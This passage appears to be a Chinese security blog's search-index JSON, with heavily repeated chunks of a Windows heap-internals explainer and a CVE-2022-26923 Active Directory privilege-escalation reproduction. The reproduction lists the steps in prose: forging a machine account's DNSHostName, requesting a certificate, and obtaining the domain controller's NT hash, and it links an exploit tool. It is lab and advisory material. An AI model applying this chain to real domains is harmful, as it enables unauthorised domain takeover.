号空表中寻找最适合的空闲快进行分配，若依然失败，则会先进行内存紧缩后再尝试分配。堆块分配流程如下图所示。 堆块释放堆块释放，即将堆块从占用状态更改为空闲状态。在准备释放某一大小的内存空间时，首先会判断释放释放的堆块是否属于巨块范畴，若是巨块，则直接将该空间释放，不会进入任何堆表。若是大块，则尝试将其释放入堆缓存，若堆缓存已满，则链入 0 号空表。若是小块，则首先尝试链入对应大小的快表，若链入快表，为了加快堆块的分配，系统不会更改其占用状态。若对应大小的快表中已经链满了 4 个空闲堆块，则将该堆块链入对应大小的空表中。 堆块合并在进行堆块释放时，若释放堆块直接进入空表（链接在快表中的空闲堆块不会进行合并操作），并且与该堆块物理地址相邻的堆块同为空闲态，则会进行堆块的合并。在进行堆块合并时，会将堆块从空表中卸下，将两个相邻的内存空间整合后更新新空闲堆块的堆头信息，并根据新空闲堆块的大小链入相应大小的空表中。除了堆块的释放会触发堆块合并外，在申请堆块时，若未成功从快表、堆缓存及空表中分配空间，则会触发内存紧缩。内存紧缩会将堆空间中的所有空闲堆块，无论地址是否连续，都整合成一个大的空闲堆块再进行堆块分配。 ","date":"2022-06-19","objectID":"/2022/06/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3-windows-%E5%A0%86%E7%AE%A1%E7%90%86%E6%9C%BA%E5%88%B6/:6:2","series":[],"tags":[],"title":"深入理解 Windows 堆管理机制","uri":"/2022/06/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3-windows-%E5%A0%86%E7%AE%A1%E7%90%86%E6%9C%BA%E5%88%B6/#堆块分配"},{"categories":[],"content":"\r堆的管理策略在内存中，堆块按大小分为 3 种，分别为小块 (\u003c1KB)、大块 (\u003c512KB) 和巨块 (≥512KB)，堆块间主要存在 3 中操作方式，分别是堆块的分配、堆块的释放、堆块的合并。 后端堆管理策略从空表进行堆块分配时，首先会找到维护对应大小的空表，将最后链入表中的空闲堆块从表中卸下，分配给用户使用，并将空表头的后项指针指向被卸下的堆块的后项堆块。若对应大小的空表内分配失败，则会寻找次优项，在下一个空表中进行分配，直到寻找到能够满足内存分配的最小内存的空闲堆块。当在空表中寻找次优项成功时，会进行切割分配，即从找到的较大堆块中切割下申请大小的堆块分配给程序使用，并将切割剩余的部分按大小加上堆头链入对应的空表。若将所有除 0 号空表外的所有空表都遍历完仍然没有分配成功，则判断 0 号空表中的最后一个堆块大小是否大于所需分配内存大小，若大于则从 0 号空表中正向查找满足分配大小的最小堆块进行分配。 前端堆管理策略从快表进行堆块分配时，首先会通过用户申请堆块大小索引到维护对应大小的快表，将最后链入表中的空闲堆块从表中卸下，分配给用户使用，并将快表头指向后项空闲堆块。 堆块分配堆块在进行分配时，主要会从上文提到的快表和空表中进行分配。 堆的分配被划分为前端堆管理器 (Front-End Manager) 和后端堆管理器 (Back-End Manager)，其中前端堆管理器主要由上文中提到的快表有关的分配机制构成，后端堆管理器则是由空表有关的分配机制构成。 在用户申请分配某一大小的内存空间时，系统会首先判断申请的堆块是否属于巨块范畴，若是巨块，则采用虚分配，在漏洞利用中遇到较少，本文不予讨论。若申请大块，则首先考虑堆缓存进行分配，若分配不成功，则从 0 号空表中寻找最合适的空闲块进行分配。若申请小块，则首先查看对应大小的快表中有没有空闲的堆块，若无则查看对应大小的空表中有没有空闲的堆块，若无则通过空表位图查找更大的空表中有没有空闲的堆块进行切割分配，若无则采用堆缓存进行分配，若分配失败，则从 0 号空表中寻找最适合的空闲快进行分配，若依然失败，则会先进行内存紧缩后再尝试分配。堆块分配流程如下图所示。 堆块释放堆块释放，即将堆块从占用状态更改为空闲状态。在准备释放某一大小的内存空间时，首先会判断释放释放的堆块是否属于巨块范畴，若是巨块，则直接将该空间释放，不会进入任何堆表。若是大块，则尝试将其释放入堆缓存，若堆缓存已满，则链入 0 号空表。若是小块，则首先尝试链入对应大小的快表，若链入快表，为了加快堆块的分配，系统不会更改其占用状态。若对应大小的快表中已经链满了 4 个空闲堆块，则将该堆块链入对应大小的空表中。 堆块合并在进行堆块释放时，若释放堆块直接进入空表（链接在快表中的空闲堆块不会进行合并操作），并且与该堆块物理地址相邻的堆块同为空闲态，则会进行堆块的合并。在进行堆块合并时，会将堆块从空表中卸下，将两个相邻的内存空间整合后更新新空闲堆块的堆头信息，并根据新空闲堆块的大小链入相应大小的空表中。除了堆块的释放会触发堆块合并外，在申请堆块时，若未成功从快表、堆缓存及空表中分配空间，则会触发内存紧缩。内存紧缩会将堆空间中的所有空闲堆块，无论地址是否连续，都整合成一个大的空闲堆块再进行堆块分配。 ","date":"2022-06-19","objectID":"/2022/06/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3-windows-%E5%A0%86%E7%AE%A1%E7%90%86%E6%9C%BA%E5%88%B6/:6:2","series":[],"tags":[],"title":"深入理解 Windows 堆管理机制","uri":"/2022/06/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3-windows-%E5%A0%86%E7%AE%A1%E7%90%86%E6%9C%BA%E5%88%B6/#堆块释放"},{"categories":[],"content":"\r堆的管理策略在内存中，堆块按大小分为 3 种，分别为小块 (\u003c1KB)、大块 (\u003c512KB) 和巨块 (≥512KB)，堆块间主要存在 3 中操作方式，分别是堆块的分配、堆块的释放、堆块的合并。 后端堆管理策略从空表进行堆块分配时，首先会找到维护对应大小的空表，将最后链入表中的空闲堆块从表中卸下，分配给用户使用，并将空表头的后项指针指向被卸下的堆块的后项堆块。若对应大小的空表内分配失败，则会寻找次优项，在下一个空表中进行分配，直到寻找到能够满足内存分配的最小内存的空闲堆块。当在空表中寻找次优项成功时，会进行切割分配，即从找到的较大堆块中切割下申请大小的堆块分配给程序使用，并将切割剩余的部分按大小加上堆头链入对应的空表。若将所有除 0 号空表外的所有空表都遍历完仍然没有分配成功，则判断 0 号空表中的最后一个堆块大小是否大于所需分配内存大小，若大于则从 0 号空表中正向查找满足分配大小的最小堆块进行分配。 前端堆管理策略从快表进行堆块分配时，首先会通过用户申请堆块大小索引到维护对应大小的快表，将最后链入表中的空闲堆块从表中卸下，分配给用户使用，并将快表头指向后项空闲堆块。 堆块分配堆块在进行分配时，主要会从上文提到的快表和空表中进行分配。 堆的分配被划分为前端堆管理器 (Front-End Manager) 和后端堆管理器 (Back-End Manager)，其中前端堆管理器主要由上文中提到的快表有关的分配机制构成，后端堆管理器则是由空表有关的分配机制构成。 在用户申请分配某一大小的内存空间时，系统会首先判断申请的堆块是否属于巨块范畴，若是巨块，则采用虚分配，在漏洞利用中遇到较少，本文不予讨论。若申请大块，则首先考虑堆缓存进行分配，若分配不成功，则从 0 号空表中寻找最合适的空闲块进行分配。若申请小块，则首先查看对应大小的快表中有没有空闲的堆块，若无则查看对应大小的空表中有没有空闲的堆块，若无则通过空表位图查找更大的空表中有没有空闲的堆块进行切割分配，若无则采用堆缓存进行分配，若分配失败，则从 0 号空表中寻找最适合的空闲快进行分配，若依然失败，则会先进行内存紧缩后再尝试分配。堆块分配流程如下图所示。 堆块释放堆块释放，即将堆块从占用状态更改为空闲状态。在准备释放某一大小的内存空间时，首先会判断释放释放的堆块是否属于巨块范畴，若是巨块，则直接将该空间释放，不会进入任何堆表。若是大块，则尝试将其释放入堆缓存，若堆缓存已满，则链入 0 号空表。若是小块，则首先尝试链入对应大小的快表，若链入快表，为了加快堆块的分配，系统不会更改其占用状态。若对应大小的快表中已经链满了 4 个空闲堆块，则将该堆块链入对应大小的空表中。 堆块合并在进行堆块释放时，若释放堆块直接进入空表（链接在快表中的空闲堆块不会进行合并操作），并且与该堆块物理地址相邻的堆块同为空闲态，则会进行堆块的合并。在进行堆块合并时，会将堆块从空表中卸下，将两个相邻的内存空间整合后更新新空闲堆块的堆头信息，并根据新空闲堆块的大小链入相应大小的空表中。除了堆块的释放会触发堆块合并外，在申请堆块时，若未成功从快表、堆缓存及空表中分配空间，则会触发内存紧缩。内存紧缩会将堆空间中的所有空闲堆块，无论地址是否连续，都整合成一个大的空闲堆块再进行堆块分配。 ","date":"2022-06-19","objectID":"/2022/06/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3-windows-%E5%A0%86%E7%AE%A1%E7%90%86%E6%9C%BA%E5%88%B6/:6:2","series":[],"tags":[],"title":"深入理解 Windows 堆管理机制","uri":"/2022/06/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3-windows-%E5%A0%86%E7%AE%A1%E7%90%86%E6%9C%BA%E5%88%B6/#堆块合并"},{"categories":[],"content":"\rWindows Vista – Windows 7","date":"2022-06-19","objectID":"/2022/06/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3-windows-%E5%A0%86%E7%AE%A1%E7%90%86%E6%9C%BA%E5%88%B6/:7:0","series":[],"tags":[],"title":"深入理解 Windows 堆管理机制","uri":"/2022/06/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3-windows-%E5%A0%86%E7%AE%A1%E7%90%86%E6%9C%BA%E5%88%B6/#windows-vista--windows-7"},{"categories":[],"content":"\r术语block: 表示 8 字节连续内存。它是堆块头部在引用大小时所用的最小度量单位。一个 chunk 是一片连续的内存空间，可以使用 blocks 或 bytes 来度量。 BlocksIndex: 是_HEAP_LIST_LOOKUP结构的别名。BlocksIndex 结构体通过 Lists 来管理 chunks，低于 0x400（1024）字节的 chunks 所在的 Lists 作为第一个 BlocksIndex，而从 0x400 到 0x4000(16k) 的块所在的 Lists 作为第二个 BlocksIndex。大于 16k 的且低于 DeCommitThreshold 和 0xFE00 blocks 的 chunks 会被组织在类似 FreeList[0] 的结构体中（在文章后面讨论）。专用 FreeLists 的概念已经消失 ListHint, FreeList : 用来表示指向 Heap-\u003eFreeLists 中特定位置的一个链表。 HeapBin, Bin, UserBlock : 表示 LFH 分配的一块具体大小的内存。很多人称之为 Bucket，但是_HEAP_BUCKET 本身是一个 0x4 字节的数据结构，用来指定一个尺寸而不是用于内存容器。 ","date":"2022-06-19","objectID":"/2022/06/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3-windows-%E5%A0%86%E7%AE%A1%E7%90%86%E6%9C%BA%E5%88%B6/:7:1","series":[],"tags":[],"title":"深入理解 Windows 堆管理机制","uri":"/2022/06/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3-windows-%E5%A0%86%E7%AE%A1%E7%90%86%E6%9C%BA%E5%88%B6/#术语"},{"categories":[],"content":"\r重要结构\r_HEAP(HeapBase)前面介绍过每个堆都是_HEAP结构进行描述的，而 Win7 针对_HEAP结构进行了一些更改，重要的更改点已经标出在结构体中。 txt kd\u003e dt _HEAP ntdll!_HEAP +0x000 Entry : _HEAP_ENTRY +0x010 SegmentSignature : Uint4B +0x014 SegmentFlags : Uint4B +0x018 SegmentListEntry : _LIST_ENTRY +0x028 Heap : Ptr64 _HEAP +0x030 BaseAddress : Ptr64 Void +0x038 NumberOfPages : Uint4B +0x040 FirstEntry : Ptr64 _HEAP_ENTRY +0x048 LastValidEntry : Ptr64 _HEAP_ENTRY +0x050 NumberOfUnCommittedPages : Uint4B +0x054 NumberOfUnCommittedRanges : Uint4B +0x058 SegmentAllocatorBackTraceIndex : Uint2B +0x05a Reserved : Uint2B +0x060 UCRSegmentList : _LIST_ENTRY +0x070 Flags : Uint4B +0x074 ForceFlags : Uint4B +0x078 CompatibilityFlags : Uint4B +0x07c EncodeFlagMask : Uint4B //用于判断堆 chunk 头部是否被编码。 +0x080 Encoding : _HEAP_ENTRY //在异或 (XOR) 操作中用于编码 chunk 头，防止可预知的元数据被污染。 +0x090 PointerKey : Uint8B +0x098 Interceptor : Uint4B +0x09c VirtualMemoryThreshold : Uint4B +0x0a0 Signature : Uint4B +0x0a8 SegmentReserve : Uint8B +0x0b0 SegmentCommit : Uint8B +0x0b8 DeCommitFreeBlockThreshold : Uint8B +0x0c0 DeCommitTotalFreeThreshold : Uint8B +0x0c8 TotalFreeSize : Uint8B +0x0d0 MaximumAllocationSize : Uint8B +0x0d8 ProcessHeapsListIndex : Uint2B +0x0da HeaderValidateLength : Uint2B +0x0e0 HeaderValidateCopy : Ptr64 Void +0x0e8 NextAvailableTagIndex : Uint2B +0x0ea MaximumTagIndex : Uint2B +0x0f0 TagEntries : Ptr64 _HEAP_TAG_ENTRY +0x0f8 UCRList : _LIST_ENTRY +0x108 AlignRound : Uint8B +0x110 AlignMask : Uint8B +0x118 VirtualAllocdBlocks : _LIST_ENTRY +0x128 SegmentList : _LIST_ENTRY +0x138 AllocatorBackTraceIndex : Uint2B +0x13c NonDedicatedListLength : Uint4B +0x140 BlocksIndex : Ptr64 Void +0x148 UCRIndex : Ptr64 Void +0x150 PseudoTagEntries : Ptr64 _HEAP_PSEUDO_TAG_ENTRY +0x158 FreeLists : _LIST_ENTRY //指向堆上所有空闲 chunk 的指针。 +0x168 LockVariable : Ptr64 _HEAP_LOCK +0x170 CommitRoutine : Ptr64 long +0x178 FrontEndHeap : Ptr64 Void //指向关联的前端堆。 +0x180 FrontHeapLockCount : Uint2B +0x182 FrontEndHeapType : UChar //1--\u003eLookaside Lists 2--\u003eLFH Win7 实际上不支持 Lookaside Lists。 +0x188 Counters : _HEAP_COUNTERS +0x1f8 TuningParameters : _HEAP_TUNING_PARAMETERS\r_HEAP_LIST_LOOKUP(HeapBase-\u003eBlocksIndex)\rtxt kd\u003e dt _HEAP_LIST_LOOKUP ntdll!_HEAP_LIST_LOOKUP +0x000 ExtendedLookup : Ptr64 _HEAP_LIST_LOOKUP // +0x008 ArraySize : Uint4B +0x00c ExtraItem : Uint4B +0x010 ItemCount : Uint4B +0x014 OutOfRangeItems : Uint4B +0x018 BaseIndex : Uint4B +0x020 ListHead : Ptr64 _LIST_ENTRY +0x028 ListsInUseUlong : Ptr64 Uint4B +0x030 ListHints : Ptr64 Ptr64 _LIST_ENTRY\r","date":"2022-06-19","objectID":"/2022/06/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3-windows-%E5%A0%86%E7%AE%A1%E7%90%86%E6%9C%BA%E5%88%B6/:7:2","series":[],"tags":[],"title":"深入理解 Windows 堆管理机制","uri":"/2022/06/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3-windows-%E5%A0%86%E7%AE%A1%E7%90%86%E6%9C%BA%E5%88%B6/#重要结构"},{"categories":[],"content":"\r重要结构\r_HEAP(HeapBase)前面介绍过每个堆都是_HEAP结构进行描述的，而 Win7 针对_HEAP结构进行了一些更改，重要的更改点已经标出在结构体中。 txt kd\u003e dt _HEAP ntdll!_HEAP +0x000 Entry : _HEAP_ENTRY +0x010 SegmentSignature : Uint4B +0x014 SegmentFlags : Uint4B +0x018 SegmentListEntry : _LIST_ENTRY +0x028 Heap : Ptr64 _HEAP +0x030 BaseAddress : Ptr64 Void +0x038 NumberOfPages : Uint4B +0x040 FirstEntry : Ptr64 _HEAP_ENTRY +0x048 LastValidEntry : Ptr64 _HEAP_ENTRY +0x050 NumberOfUnCommittedPages : Uint4B +0x054 NumberOfUnCommittedRanges : Uint4B +0x058 SegmentAllocatorBackTraceIndex : Uint2B +0x05a Reserved : Uint2B +0x060 UCRSegmentList : _LIST_ENTRY +0x070 Flags : Uint4B +0x074 ForceFlags : Uint4B +0x078 CompatibilityFlags : Uint4B +0x07c EncodeFlagMask : Uint4B //用于判断堆 chunk 头部是否被编码。 +0x080 Encoding : _HEAP_ENTRY //在异或 (XOR) 操作中用于编码 chunk 头，防止可预知的元数据被污染。 +0x090 PointerKey : Uint8B +0x098 Interceptor : Uint4B +0x09c VirtualMemoryThreshold : Uint4B +0x0a0 Signature : Uint4B +0x0a8 SegmentReserve : Uint8B +0x0b0 SegmentCommit : Uint8B +0x0b8 DeCommitFreeBlockThreshold : Uint8B +0x0c0 DeCommitTotalFreeThreshold : Uint8B +0x0c8 TotalFreeSize : Uint8B +0x0d0 MaximumAllocationSize : Uint8B +0x0d8 ProcessHeapsListIndex : Uint2B +0x0da HeaderValidateLength : Uint2B +0x0e0 HeaderValidateCopy : Ptr64 Void +0x0e8 NextAvailableTagIndex : Uint2B +0x0ea MaximumTagIndex : Uint2B +0x0f0 TagEntries : Ptr64 _HEAP_TAG_ENTRY +0x0f8 UCRList : _LIST_ENTRY +0x108 AlignRound : Uint8B +0x110 AlignMask : Uint8B +0x118 VirtualAllocdBlocks : _LIST_ENTRY +0x128 SegmentList : _LIST_ENTRY +0x138 AllocatorBackTraceIndex : Uint2B +0x13c NonDedicatedListLength : Uint4B +0x140 BlocksIndex : Ptr64 Void +0x148 UCRIndex : Ptr64 Void +0x150 PseudoTagEntries : Ptr64 _HEAP_PSEUDO_TAG_ENTRY +0x158 FreeLists : _LIST_ENTRY //指向堆上所有空闲 chunk 的指针。 +0x168 LockVariable : Ptr64 _HEAP_LOCK +0x170 CommitRoutine : Ptr64 long +0x178 FrontEndHeap : Ptr64 Void //指向关联的前端堆。 +0x180 FrontHeapLockCount : Uint2B +0x182 FrontEndHeapType : UChar //1--\u003eLookaside Lists 2--\u003eLFH Win7 实际上不支持 Lookaside Lists。 +0x188 Counters : _HEAP_COUNTERS +0x1f8 TuningParameters : _HEAP_TUNING_PARAMETERS\r_HEAP_LIST_LOOKUP(HeapBase-\u003eBlocksIndex)\rtxt kd\u003e dt _HEAP_LIST_LOOKUP ntdll!_HEAP_LIST_LOOKUP +0x000 ExtendedLookup : Ptr64 _HEAP_LIST_LOOKUP // +0x008 ArraySize : Uint4B +0x00c ExtraItem : Uint4B +0x010 ItemCount : Uint4B +0x014 OutOfRangeItems : Uint4B +0x018 BaseIndex : Uint4B +0x020 ListHead : Ptr64 _LIST_ENTRY +0x028 ListsInUseUlong : Ptr64 Uint4B +0x030 ListHints : Ptr64 Ptr64 _LIST_ENTRY\r","date":"2022-06-19","objectID":"/2022/06/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3-windows-%E5%A0%86%E7%AE%A1%E7%90%86%E6%9C%BA%E5%88%B6/:7:2","series":[],"tags":[],"title":"深入理解 Windows 堆管理机制","uri":"/2022/06/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3-windows-%E5%A0%86%E7%AE%A1%E7%90%86%E6%9C%BA%E5%88%B6/#_heapheapbase"},{"categories":[],"content":"\r重要结构\r_HEAP(HeapBase)前面介绍过每个堆都是_HEAP结构进行描述的，而 Win7 针对_HEAP结构进行了一些更改，重要的更改点已经标出在结构体中。 txt kd\u003e dt _HEAP ntdll!_HEAP +0x000 Entry : _HEAP_ENTRY +0x010 SegmentSignature : Uint4B +0x014 SegmentFlags : Uint4B +0x018 SegmentListEntry : _LIST_ENTRY +0x028 Heap : Ptr64 _HEAP +0x030 BaseAddress : Ptr64 Void +0x038 NumberOfPages : Uint4B +0x040 FirstEntry : Ptr64 _HEAP_ENTRY +0x048 LastValidEntry : Ptr64 _HEAP_ENTRY +0x050 NumberOfUnCommittedPages : Uint4B +0x054 NumberOfUnCommittedRanges : Uint4B +0x058 SegmentAllocatorBackTraceIndex : Uint2B +0x05a Reserved : Uint2B +0x060 UCRSegmentList : _LIST_ENTRY +0x070 Flags : Uint4B +0x074 ForceFlags : Uint4B +0x078 CompatibilityFlags : Uint4B +0x07c EncodeFlagMask : Uint4B //用于判断堆 chunk 头部是否被编码。 +0x080 Encoding : _HEAP_ENTRY //在异或 (XOR) 操作中用于编码 chunk 头，防止可预知的元数据被污染。 +0x090 PointerKey : Uint8B +0x098 Interceptor : Uint4B +0x09c VirtualMemoryThreshold : Uint4B +0x0a0 Signature : Uint4B +0x0a8 SegmentReserve : Uint8B +0x0b0 SegmentCommit : Uint8B +0x0b8 DeCommitFreeBlockThreshold : Uint8B +0x0c0 DeCommitTotalFreeThreshold : Uint8B +0x0c8 TotalFreeSize : Uint8B +0x0d0 MaximumAllocationSize : Uint8B +0x0d8 ProcessHeapsListIndex : Uint2B +0x0da HeaderValidateLength : Uint2B +0x0e0 HeaderValidateCopy : Ptr64 Void +0x0e8 NextAvailableTagIndex : Uint2B +0x0ea MaximumTagIndex : Uint2B +0x0f0 TagEntries : Ptr64 _HEAP_TAG_ENTRY +0x0f8 UCRList : _LIST_ENTRY +0x108 AlignRound : Uint8B +0x110 AlignMask : Uint8B +0x118 VirtualAllocdBlocks : _LIST_ENTRY +0x128 SegmentList : _LIST_ENTRY +0x138 AllocatorBackTraceIndex : Uint2B +0x13c NonDedicatedListLength : Uint4B +0x140 BlocksIndex : Ptr64 Void +0x148 UCRIndex : Ptr64 Void +0x150 PseudoTagEntries : Ptr64 _HEAP_PSEUDO_TAG_ENTRY +0x158 FreeLists : _LIST_ENTRY //指向堆上所有空闲 chunk 的指针。 +0x168 LockVariable : Ptr64 _HEAP_LOCK +0x170 CommitRoutine : Ptr64 long +0x178 FrontEndHeap : Ptr64 Void //指向关联的前端堆。 +0x180 FrontHeapLockCount : Uint2B +0x182 FrontEndHeapType : UChar //1--\u003eLookaside Lists 2--\u003eLFH Win7 实际上不支持 Lookaside Lists。 +0x188 Counters : _HEAP_COUNTERS +0x1f8 TuningParameters : _HEAP_TUNING_PARAMETERS\r_HEAP_LIST_LOOKUP(HeapBase-\u003eBlocksIndex)\rtxt kd\u003e dt _HEAP_LIST_LOOKUP ntdll!_HEAP_LIST_LOOKUP +0x000 ExtendedLookup : Ptr64 _HEAP_LIST_LOOKUP // +0x008 ArraySize : Uint4B +0x00c ExtraItem : Uint4B +0x010 ItemCount : Uint4B +0x014 OutOfRangeItems : Uint4B +0x018 BaseIndex : Uint4B +0x020 ListHead : Ptr64 _LIST_ENTRY +0x028 ListsInUseUlong : Ptr64 Uint4B +0x030 ListHints : Ptr64 Ptr64 _LIST_ENTRY\r","date":"2022-06-19","objectID":"/2022/06/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3-windows-%E5%A0%86%E7%AE%A1%E7%90%86%E6%9C%BA%E5%88%B6/:7:2","series":[],"tags":[],"title":"深入理解 Windows 堆管理机制","uri":"/2022/06/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3-windows-%E5%A0%86%E7%AE%A1%E7%90%86%E6%9C%BA%E5%88%B6/#_heap_list_lookupheapbase-blocksindex"},{"categories":[],"content":"\r参考https://www.jianshu.com/p/a853040d2804 ","date":"2022-06-19","objectID":"/2022/06/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3-windows-%E5%A0%86%E7%AE%A1%E7%90%86%E6%9C%BA%E5%88%B6/:8:0","series":[],"tags":[],"title":"深入理解 Windows 堆管理机制","uri":"/2022/06/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3-windows-%E5%A0%86%E7%AE%A1%E7%90%86%E6%9C%BA%E5%88%B6/#参考"},{"categories":[],"content":"\r漏洞信息","date":"2022-06-02","objectID":"/2022/06/cve-202226923-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%88%86%E6%9E%90/:1:0","series":[],"tags":[],"title":"CVE 2022–26923 漏洞复现及分析","uri":"/2022/06/cve-202226923-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%88%86%E6%9E%90/#漏洞信息"},{"categories":[],"content":"\r漏洞简述 漏洞名称：AD域权限提升漏洞 漏洞编号：CVE-2022–26923 漏洞类型：设计缺陷 漏洞影响：权限提升 CVSS评分：3.1 8.8 / 7.7 利用难度：Medium 基础权限：需要 ","date":"2022-06-02","objectID":"/2022/06/cve-202226923-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%88%86%E6%9E%90/:1:1","series":[],"tags":[],"title":"CVE 2022–26923 漏洞复现及分析","uri":"/2022/06/cve-202226923-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%88%86%E6%9E%90/#漏洞简述"},{"categories":[],"content":"\r漏洞影响受影响的 Windows 版本： Windows 8.1 Windows 10 Version 1607, 1809, 1909, 2004, 20H2, 21H1, 21H2 Windows 11 Windows Server 2008，2012，2016，2019，2022 ","date":"2022-06-02","objectID":"/2022/06/cve-202226923-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%88%86%E6%9E%90/:1:2","series":[],"tags":[],"title":"CVE 2022–26923 漏洞复现及分析","uri":"/2022/06/cve-202226923-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%88%86%E6%9E%90/#漏洞影响"},{"categories":[],"content":"\r解决方案官方已经提供了修补程序： https://msrc.microsoft.com/update-guide/vulnerability/CVE-2022-26923 ","date":"2022-06-02","objectID":"/2022/06/cve-202226923-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%88%86%E6%9E%90/:1:3","series":[],"tags":[],"title":"CVE 2022–26923 漏洞复现及分析","uri":"/2022/06/cve-202226923-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%88%86%E6%9E%90/#解决方案"},{"categories":[],"content":"\r漏洞复现","date":"2022-06-02","objectID":"/2022/06/cve-202226923-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%88%86%E6%9E%90/:2:0","series":[],"tags":[],"title":"CVE 2022–26923 漏洞复现及分析","uri":"/2022/06/cve-202226923-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%88%86%E6%9E%90/#漏洞复现"},{"categories":[],"content":"\r环境搭建靶机：Windows Server 2019 Standard 17763.379 攻击机：Windows 7 x64 SP1 exp: https://github.com/ly4k/Certipy 配置：证书服务安装过程按默认配置进行，选择企业 CA（独立 CA 虽然也能实现证书颁发，但是并不会泄露域控证书）。 准备：普通域账号 ","date":"2022-06-02","objectID":"/2022/06/cve-202226923-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%88%86%E6%9E%90/:2:1","series":[],"tags":[],"title":"CVE 2022–26923 漏洞复现及分析","uri":"/2022/06/cve-202226923-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%88%86%E6%9E%90/#环境搭建"},{"categories":[],"content":"\r环境搭建靶机：Windows Server 2019 Standard 17763.379 攻击机：Windows 7 x64 SP1 exp: https://github.com/ly4k/Certipy 配置：证书服务安装过程按默认配置进行，选择企业 CA（独立 CA 虽然也能实现证书颁发，但是并不会泄露域控证书）。 准备：普通域账号 ","date":"2022-06-02","objectID":"/2022/06/cve-202226923-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%88%86%E6%9E%90/:2:1","series":[],"tags":[],"title":"CVE 2022–26923 漏洞复现及分析","uri":"/2022/06/cve-202226923-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%88%86%E6%9E%90/#配置证书服务"},{"categories":[],"content":"\r环境搭建靶机：Windows Server 2019 Standard 17763.379 攻击机：Windows 7 x64 SP1 exp: https://github.com/ly4k/Certipy 配置：证书服务安装过程按默认配置进行，选择企业 CA（独立 CA 虽然也能实现证书颁发，但是并不会泄露域控证书）。 准备：普通域账号 ","date":"2022-06-02","objectID":"/2022/06/cve-202226923-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%88%86%E6%9E%90/:2:1","series":[],"tags":[],"title":"CVE 2022–26923 漏洞复现及分析","uri":"/2022/06/cve-202226923-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%88%86%E6%9E%90/#准备普通域账号"},{"categories":[],"content":"\r复现过程\r利用 impacket 根据现有账户创建机器账号 修改 servicePrincipalName 修改 DNSHostName 通过 certipy 工具申请证书 通过证书进行认证，获取域控的 NT hash 值 再利用 NT hash 值读取账号信息 获取域控权限 ","date":"2022-06-02","objectID":"/2022/06/cve-202226923-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%88%86%E6%9E%90/:2:2","series":[],"tags":[],"title":"CVE 2022–26923 漏洞复现及分析","uri":"/2022/06/cve-202226923-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%88%86%E6%9E%90/#复现过程"},{"categories":[],"content":"\r复现过程\r利用 impacket 根据现有账户创建机器账号 修改 servicePrincipalName 修改 DNSHostName 通过 certipy 工具申请证书 通过证书进行认证，获取域控的 NT hash 值 再利用 NT hash 值读取账号信息 获取域控权限 ","date":"2022-06-02","objectID":"/2022/06/cve-202226923-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%88%86%E6%9E%90/:2:2","series":[],"tags":[],"title":"CVE 2022–26923 漏洞复现及分析","uri":"/2022/06/cve-202226923-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%88%86%E6%9E%90/#利用-impacket-根据现有账户创建机器账号"},{"categories":[],"content":"\r复现过程\r利用 impacket 根据现有账户创建机器账号 修改 servicePrincipalName 修改 DNSHostName 通过 certipy 工具申请证书 通过证书进行认证，获取域控的 NT hash 值 再利用 NT hash 值读取账号信息 获取域控权限 ","date":"2022-06-02","objectID":"/2022/06/cve-202226923-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%88%86%E6%9E%90/:2:2","series":[],"tags":[],"title":"CVE 2022–26923 漏洞复现及分析","uri":"/2022/06/cve-202226923-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%88%86%E6%9E%90/#修改-serviceprincipalname"},{"categories":[],"content":"\r复现过程\r利用 impacket 根据现有账户创建机器账号 修改 servicePrincipalName 修改 DNSHostName 通过 certipy 工具申请证书 